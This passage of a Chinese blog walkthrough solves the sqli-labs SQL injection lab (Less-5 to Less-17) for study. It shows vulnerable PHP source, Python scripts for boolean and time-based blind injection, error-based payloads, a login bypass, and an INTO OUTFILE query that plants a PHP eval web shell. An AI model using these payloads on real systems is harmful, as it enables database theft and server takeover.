class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;  <span class="comment">//不返回查询结果</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());   <span class="comment">//输出错误</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload1：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">character = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">length = <span class="number">32</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> character:</span><br><span class="line">        url = <span class="string">"http://127.0.0.1/sqli-labs/Less-5/?id=1' and ascii(substr((select database()),%d,1)) = %d --+"</span> \</span><br><span class="line">              % (i, ord(c))</span><br><span class="line">        r = s.get(url).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>payload2:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id=1' and updatexml(1,concat('~',(your_payload),'~'),3) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?id=1' and extractvalue(1,concat(0x7e,(your_payload),0x7e)) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?id=1' and exp(~(<span class="keyword">select</span> * <span class="keyword">from</span> (your_payload) a) ); <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?id=1' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(((your_payload)),<span class="keyword">floor</span> (<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>单引号变为双引号，修改一下Less-5的payload即可。</p><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>考察点：sql文件操作</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>.$sql.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in.... Use outfile......'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You have an error in your SQL syntax'</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示我们用outfile，我们可以写一个shell进去。</p><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'&lt;script language='</span>php<span class="string">'&gt;@eval($_POST['</span>sketch_pl4ne<span class="string">'])&lt;/script&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'C:\\xxx\\xxx\\xxx\\output.php'</span> <span class="comment">--+  需要是绝对路径</span></span><br></pre></td></tr></table></figure><p>蚁剑连接：</p><p><img src="https://t1.picb.cc/uploads/2019/10/09/gLRpOs.png" alt=""></p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>考察点：布尔盲注</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo 'You are in...........';</span></span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="comment">//echo "You have an error in your SQL syntax";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PS：看代码要仔细，这里不输出错误信息，只能盲注。</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">character = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">length = <span class="number">32</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> character:</span><br><span class="line">        url = <span class="string">"http://127.0.0.1/sqli-labs/Less-8/?id=1' and ascii(substr((select database()),%d,1)) = %d --+"</span> \</span><br><span class="line">              % (i, ord(c))</span><br><span class="line">        r = s.get(url).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>考察点：时间盲注</p><p>源码：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br><span class="line"><span class="string">$result=mysql_query($sql);</span></span><br><span class="line"><span class="string">$row = mysql_fetch_array($result);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if($row)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  echo '&lt;font size="</span><span class="number">5</span><span class="string">" color="</span><span class="comment">#FFFF00"&gt;';</span></span><br><span class="line">  echo <span class="string">'You are in...........'</span>;</span><br><span class="line">  echo "&lt;br&gt;";</span><br><span class="line">    echo "&lt;/font&gt;";</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">echo '&lt;font size="5" color="#FFFF00"&gt;';</span><br><span class="line">echo 'You are in...........';</span><br><span class="line">//print_r(mysql_error());</span><br><span class="line">//echo "You have an error in your SQL syntax";</span><br><span class="line">echo "&lt;/br&gt;&lt;/font&gt;";</span><br><span class="line">echo '&lt;font color= "#0000ff" font size= 3&gt;';</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里都会输出<code>You are in...........</code>，也就是说根据返回页面无法判断语句是否执行成功。</p><p>所以这里我们用时间盲注。</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">character = string.digits + string.ascii_letters + string.punctuation</span><br><span class="line">flag_length = <span class="number">40</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, flag_length):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> character:</span><br><span class="line">        url = <span class="string">"http://127.0.0.1/sqli-labs/Less-9/?id=1' and if((ascii(substr((select database()),%d,1)))=%d,sleep(5),0) --+"</span> % (i, ord(c))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s.get(url, timeout=<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span>.$id.<span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="comment">//echo "You have an error in your SQL syntax";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><p>单引号改为双引号 ，payload参考上一题= =</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>考察点：POST注入</p><p>目前来说与GET并没有太大区别，之后讲宽字节注入时会加以区分。</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">" You Have successfully logged in\n\n "</span> ;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"  /&gt;'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Try again looser"</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg" /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=admin' or 1 <span class="comment">#</span></span><br><span class="line">&amp;passwd=everything</span><br><span class="line">&amp;submit=Submit</span><br></pre></td></tr></table></figure><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">$uname=<span class="string">'"'</span>.$uname.<span class="string">'"'</span>;</span><br><span class="line">$passwd=<span class="string">'"'</span>.$passwd.<span class="string">'"'</span>;</span><br></pre></td></tr></table></figure><p>payload：</p><p>Less-11的传参添加双引号，参考上一题。</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>考察点：布尔盲注</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line"><span class="comment">//echo " You Have successfully logged in " ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">//echo 'Your Login name:'. $row['username'];</span></span><br><span class="line"><span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line"><span class="comment">//echo 'Your Password:' .$row['password'];</span></span><br><span class="line"><span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"   /&gt;'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo "Try again looser";</span></span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg"   /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现没有回显，但是有图片成功或者失败的提示，考虑布尔盲注。</p><p>payload：</p><p>脚本编写参考Less-8，关键是找到有不同回显的地方，当然以及注入点。</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname=<span class="string">'"'</span>.$uname.<span class="string">'"'</span>;</span><br><span class="line">$passwd=<span class="string">'"'</span>.$passwd.<span class="string">'"'</span>; </span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payload：</p><p>脚本编写参考Less-8。</p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"><span class="comment">// @$sql 不显示错误提示</span></span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payload：</p><p>换汤不换药，采用布尔盲注与时间盲注均可。</p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line">$uname=<span class="string">'"'</span>.$uname.<span class="string">'"'</span>;</span><br><span class="line">$passwd=<span class="string">'"'</span>.$passwd.<span class="string">'"'</span>; </span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payload：</p><p>依然是换汤不换药，但也提醒我们要留意参数可能存在的情况：’$id’，”$id”，($id)，(“$id”)，(‘$id’)，(($id))等等。</p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>考察点：update语句注入</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//有点狠的过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line">$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$value = stripslashes($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span 